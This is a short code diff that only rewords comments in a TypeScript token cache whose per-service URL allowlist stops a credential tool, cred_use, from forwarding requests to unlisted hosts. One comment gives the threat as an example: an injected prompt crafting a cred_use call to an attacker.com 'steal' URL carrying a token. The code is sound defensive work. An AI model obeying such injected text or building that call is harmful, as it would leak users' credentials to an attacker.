@@ -21,7 +21,7 @@ export interface TokenEntry {
 
 /**
  * Known safe API base URLs per service.
- * cred_use refuses to proxy requests to any URL not on this list.
+ * cred_use refuses to forward requests to any URL not on this list.
  */
 const SERVICE_ALLOWLIST: Record<string, string[]> = {
   google: [
@@ -89,7 +89,7 @@ export class TokenCache {
   }
 
   /**
-   * Validate that a URL is safe to proxy for the given service.
+   * Validate that a URL is safe to forward for the given service.
    *
    * Prevents SSRF: without this check, an injected prompt could craft a
    * cred_use call with url="https://attacker.com/steal?t=..." and the
